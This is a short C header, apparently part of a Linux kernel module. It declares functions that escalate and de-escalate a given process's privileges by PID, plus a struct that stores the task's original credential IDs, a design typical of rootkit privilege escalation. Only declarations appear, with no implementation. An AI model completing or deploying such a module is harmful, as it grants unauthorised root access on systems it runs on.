#ifndef ESCALATION_H
#define ESCALATION_H

#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/list.h>
#include <linux/rwlock.h>
#include <linux/rcupdate.h>

/* struct for saving old creds */
struct cred_node {
	int pid;
	struct task_struct *task, *parent, *real_parent;
	kuid_t uid, suid, euid, fsuid;
	kgid_t gid, sgid, egid, fsgid;
};

void process_escalate(int pid);
void process_deescalate(int pid);

int priv_escalation_init(void);
void priv_escalation_exit(void);

#endif